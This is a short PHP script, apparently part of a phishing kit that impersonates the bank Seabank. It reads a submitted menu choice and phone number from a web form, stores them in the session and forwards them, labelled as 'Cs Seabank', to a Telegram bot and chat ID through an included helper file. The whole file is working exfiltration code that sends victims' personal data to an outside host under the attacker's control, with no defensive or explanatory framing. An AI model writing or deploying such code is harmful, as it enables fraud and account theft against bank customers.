<?php
session_start();
include "./telegram.php";

$tarif = $_POST['tarif'];
$_SESSION['tarif'] = $tarif;
$nohp = $_POST['nohp'];
$_SESSION['nohp'] = $nohp;

$message = "
Seabank Menu Pilihan
───────────────────────
• Menu Pilihan : $tarif
• Nomor Handphone : $nohp
───────────────────────
© Cs Seabank - 2026
";

sendMessage($wahyustr_id, $message, $wahyustr_bot);

?>